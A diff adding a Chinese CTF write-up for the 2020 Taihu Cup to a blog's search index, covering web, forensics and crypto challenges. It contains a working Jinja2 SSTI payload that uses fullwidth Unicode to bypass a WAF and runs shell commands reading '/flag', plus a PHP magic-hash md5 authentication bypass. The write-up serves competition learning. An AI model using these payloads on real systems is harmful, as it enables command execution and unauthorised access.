@@ -15374,4 +15374,91 @@ if __name__ == '__main__':
         <tag>CTF</tag>
       </tags>
   </entry>
+  <entry>
+    <title>2020太湖杯WP</title>
+    <url>/2020/11/07/tai-hu-bei-2020/</url>
+    <content><![CDATA[<blockquote>
+<p>比赛题目都存了一份打包上传了，链接如下：</p>
+<p>链接: <a href="https://pan.baidu.com/s/1LtiIfyD6kxkwP1m_7pGaEQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1LtiIfyD6kxkwP1m_7pGaEQ</a>  密码: l8ir</p>
+</blockquote>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="checkingame【已解决】"><a href="#checkingame【已解决】" class="headerlink" title="checkingame【已解决】"></a>checkingame【已解决】</h3><p>控制台执行</p>
+<pre class=" language-plain"><code class="language-plain">var game = new Game();
+game.winning()</code></pre>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/web1.png" alt="图片"></p>
+<h3 id="easyweb【已解决】"><a href="#easyweb【已解决】" class="headerlink" title="easyweb【已解决】"></a>easyweb【已解决】</h3><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>利用unicode编码规范化绕过waf，再加SSTI</p>
+<p>payload：</p>
+<pre class=" language-plain"><code class="language-plain">﹛﹛config.__class__.__init__.__globals__[＇os＇].popen(＇ls /＇).read()﹜﹜
+﹛﹛config.__class__.__init__.__globals__[＇os＇].popen(＇cat /flag＇).read()﹜﹜</code></pre>
+<blockquote>
+<p><a href="https://www.anquanke.com/post/id/211363#h2-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/211363#h2-2</a></p>
+</blockquote>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/web2.png" alt="图片"></p>
+<h3 id="crossfire"><a href="#crossfire" class="headerlink" title="crossfire"></a>crossfire</h3><h3 id="ezMD5【已解决】"><a href="#ezMD5【已解决】" class="headerlink" title="ezMD5【已解决】"></a>ezMD5【已解决】</h3><pre class=" language-php"><code class="language-php">
+<span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">auth</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span>  <span class="token keyword">and</span> <span class="token variable">$result</span> <span class="token operator">!==</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token keyword">echo</span> <span class="token string">"bingo : &lt;b>$flag&lt;/b>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>数组报错<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/web3.png" alt="图片"></p>
+<p><a href="http://122.112.253.121:10032/robots.txt" target="_blank" rel="noopener">http://122.112.253.121:10032/robots.txt</a></p>
+<p>auth.so</p>
+<p>payload：</p>
+<pre class=" language-plain"><code class="language-plain">name=240610708&password=abcdabcdabcdabcdabcdabcdabcdabcdQNKCDZO&submit=%E7%99%BB%E5%BD%95</code></pre>
+<p><a href="https://ctftime.org/writeup/11325" target="_blank" rel="noopener">https://ctftime.org/writeup/11325</a><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/web3-2.png" alt="图片"></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="memory【已解决】"><a href="#memory【已解决】" class="headerlink" title="memory【已解决】"></a>memory【已解决】</h3><p>flag{From_Mem_to_find_ans}</p>
+<pre class=" language-plain"><code class="language-plain">vol.py -f dump --profile=Win7SP1x86_23418 pslist
+vol.py -f dump --profile=Win7SP1x86_23418 dlllist
+上面的没发现什么
+看一下文件，太多..
+vol.py -f dump --profile=Win7SP1x86_23418 filescan
+发现进程有浏览器，看一下历史记录
+vol.py -f dump --profile=Win7SP1x86_23418 iehistory
+发现这个：
+Volatility Foundation Volatility Framework 2.6.1
+**************************************************
+Process: 2072 explorer.exe
+Cache type "URL " at 0x1a45000
+Record length: 0x100
+Location: :2020110520201106: link3@file:///C:/Users/link3/Desktop/Untitled.png
+Last modified: 2020-11-05 00:11:38 UTC+0000
+Last accessed: 2020-11-04 16:11:39 UTC+0000
+File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0
+去文件列表找对应的文件，然后提取
+vol.py -f dump --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003fdf6118 --name Untitled.png -D ./
+得到flag</code></pre>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/misc1-1.png" alt="图片"></p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/misc1-2.png" alt="图片"></p>
+<h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><p> 给了一个word和加密的压缩包</p>
+<p>word内容base64</p>
+<pre class=" language-plain"><code class="language-plain">Salted__xy RËM.ËJuÞZÒóÂ ppõéØD´l{ÒEGªÜ#ÀøÏ(¶o¨Náì@Eò?ä)ìàµtÚó;OïAeXéIÝwöpÐÍãÐø»èKúX7v:;ï%S¬Ò¾ä3jôIwÞÑÒ«v3$dÁKVlh¿°`¼µ9Í~ÂåÑ$6%äÉÿÚ5MõSÉÍòâDñû+0òö¬§ZWÓÙi(¬®§Pñ
+ïÄógHÑ2þ$í²µL¿ÞgOKU[mýÅ¾Ø -.ªæ_âv9ùhF{¦ü
+Þ²xsúñ¶ÇT£º°a"º}ÌÕ+ì@K×w·òf19¥FPÊ®©cÕaI\¸qúi»PÀÛoèÙÄÈ9A óÀøirìØJS     Ø]+^Ó_¼öýb>©ÉôX5táeô¼úV°(ï%å½|X^IW§!¢îë.¤+(ÀãQBR×LD^
+Ñò·«îø¹2^°ûm¶AhÛ$]ÙØGoY*6w"p©3Í)g¯ÿárpþ(ü1öS
+àBKýâ\I$H)òÊ{®9åö¸Ù@¶-µâ`Yaþ§çàñÈYýÉ+Í} Ü¬ç-ïøE¯ÔÕepÃ[íÍSþb¿È'H¤s2ïAÞ®jòItO&ozzß©ÎÏ¶|ìQåä¦­9"L¬ß]üBÜÑHVÃs´s¾yP;¿÷åG-EäS·rå15u§ªvzóqp¬Î[q¾NíÿC)¤Yª6³ùËqå¾qgÅÅ#i,è¾Ú´»Í÷!/¨Ý?­rä:fYîa0Ïô~]ÕïHk÷Ã?J¯t¢~9.N>Xçn°ú{B¡GeüíÝ"¶u#ùâ0}«ÂªÆÂ[÷çÒ
+d¢üw±ÌG¬ÎgÁ³K½.i?y®CÚV°¼¡$
+b2x o1qgþ³Üíä([»¿×gz3º~Q%Ã.PUÐ_ï©zè¦èþ
+Àq«E[/ª*D
+Þ.­¹¼:ª³'´*îCØ´Dª¡ÊË!P¶VùqâíRØø^</code></pre>
+<p>AES rabbit都不行 不知道有没有密钥勾选</p>
+<p>隐藏文字看到</p>
+<p><code>waoootu.epj,nv o</code></p>
+<p><code>www.verymuch.net</code></p>
+<p>解密得到<code>love and peaceee</code></p>
+<p>刚刚base64解密的带<code>Salted__</code>， 大概率是rabbit加密 </p>
+<p>解密得到</p>
+<pre><code>LR2TMNLCGBOHKNDGGVRFY5JWGZTDAXDVMZTDCYK4OU4GCZRYLR2TSNTCHBOHKNJUMM4VY5JVGBSTOXDVHE3DIZC4OU2TIM3ELR2TQYLGHBOHKOJWGQYFY5JWGQ3DSXDVHE3GEOC4OU2TAZJXLR2TOZRTMROHKOBVME4VY5JVGRQTIXDVHAYDEOC4OU4GCZRYLR2TSNTCHBOHKNRRGY3VY5JVHA2WKXDVHAZDOMS4OU2WGMDBLR2TKNDDHFOHKODGMU3FY5JYMFSTMXDVG5QTOYK4OU3DENBQLR2TSNRUMROHKNRSGEYVY5JVMZTDKXDVHE3GEOC4OU3TSNJXLR2TQYLFGZOHKNLGMY2VY5JVGRRTSXDVHE3DIMC4OU2TMYRULR2TKNDDHFOHKNJWMM4VY5JUMZSWKXDVGU4TGN24OU4TMM3GLR2TMY3FGJOHKOBSG4ZFY5JYGM4GCXDVGVRGGMS4OU4GCZJWLR2TKOBVMVOHKNJUHEZFY5JYGM4GCXDVG43TGZK4OU3DEMJRLR2TKNDDHFOHKNRSGQYFY5JUMYYGMXDVHAYDKZK4OU4DKYJZLR2TSNTCHBOHKNRRGBSFY5JZGVRWIXDVGU2DGNS4OU3DENBQLR2TIZTFMVOHKNRWGJTFY5JYGI3TEXDVGY2DMOK4OU4GCMZWLR2TKNTCGROHKNJUMM4VY5JZHA2TQXDVGYYTAZC4OU2TIYZZLR2TKMZXGNOHKNDGMVSVY5JVGRRTSXDVG5QTOYK4OU4DOMLDLR2TSNRUGBOHKNJWMM4VY5JUMYYGMXDVGVTGMNK4OU2TIYZZLR2TMNBWHFOHKNJUMM4VY5JUMVQTMXDVHAZTQYK4OU2TIYZZLR2TONZTMVOHKNJUME2FY5JVHE4DEXDVHE4DKOC4OU2TSOBS
+</code></pre><p>base32+unicode+与佛论禅得到：<code>Live beautifully, dream passionately, love completely.</code></p>
+<p>解压给的压缩包，看频谱图，得到flag</p>
+<h3 id="broken-secret"><a href="#broken-secret" class="headerlink" title="broken secret"></a>broken secret</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/misc3.png" alt="图片"></p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="Certificate-Authority"><a href="#Certificate-Authority" class="headerlink" title="Certificate Authority"></a>Certificate Authority</h3><p>或许相关：</p>
+<p><a href="https://research.kudelskisecurity.com/2020/01/15/cve-2020-0601-the-chainoffools-attack-explained-with-poc/" target="_blank" rel="noopener">https://research.kudelskisecurity.com/2020/01/15/cve-2020-0601-the-chainoffools-attack-explained-with-poc/</a></p>
+<p><a href="http://showlinkroom.me/2020/01/21/CVE-2020-0601-Research/" target="_blank" rel="noopener">http://showlinkroom.me/2020/01/21/CVE-2020-0601-Research/</a></p>
+<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
 </search>
